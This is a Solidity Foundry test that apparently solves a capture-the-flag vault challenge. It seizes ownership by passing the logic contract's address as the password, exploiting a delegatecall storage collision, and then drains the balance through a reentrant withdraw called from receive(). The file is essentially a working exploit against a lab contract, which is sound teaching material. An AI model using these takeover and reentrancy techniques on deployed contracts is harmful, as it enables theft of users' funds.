// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(this);

    bool start_attack = false;

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        bytes32 setupPassword = bytes32("0x1234");
        logic = new VaultLogic(setupPassword);
        console2.log("logic address:", address(logic));
        vault = new Vault(address(logic));
        console2.log("vault address:", address(vault));
        vault.deposite{ value: 0.1 ether }();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));

        bytes32 password = bytes32(uint256(uint160(address(logic))));

        bytes memory callData = abi.encodePacked(selector, password, uint256(uint160(palyer)));

        console2.log("callData:");
        console2.logBytes(callData);

        console2.logBytes4(selector);
        console2.logBytes32(password);

        (bool success,) = address(vault).call(callData);

        assertEq(vault.owner(), palyer);

        vault.openWithdraw();

        // trigger receive to attack
        start_attack = true;
        vault.deposite{ value: 0.01 ether }();

        console2.log("vault balance before attack:", address(vault).balance);

        vault.withdraw();

        console2.log("vault balance after attack:", address(vault).balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

    receive() external payable {
        if (start_attack) {
            console2.log("-------attacked ------");
            // start_attack = false;
            vault.withdraw();
        }
    }
}
